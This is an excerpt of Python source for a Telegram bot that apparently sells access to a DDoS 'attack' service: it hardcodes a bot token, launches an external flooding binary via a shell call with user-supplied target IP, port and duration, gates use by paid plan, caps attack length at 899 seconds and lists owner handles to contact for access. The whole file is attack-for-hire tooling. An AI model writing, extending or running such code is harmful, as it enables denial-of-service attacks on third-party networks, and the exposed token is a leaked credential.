...
TOKEN = '6913030366:AAEtMr3xpYaioIzEk7iYT_Mio7YgXrEjluE'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./mrin {target_ip} {target_port} {duration} 1800")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @X9HYDRA @Anjalisingh05072006 @Vaibhav264 & @Ritikkplayz.*", parse_mode='Markdown')  # Contact owner message
            return
...
def process_attack_command(message):
    try:
        ...
        if target_port in blocked_ports:
            ...
            return
        if duration >= 900:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 899 seconds.*\n"  # Duration limit message
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @X9HYDRA @Anjalisingh05072006 @Vaibhav264 & @Ritikkplayz* "  # Contact owner message
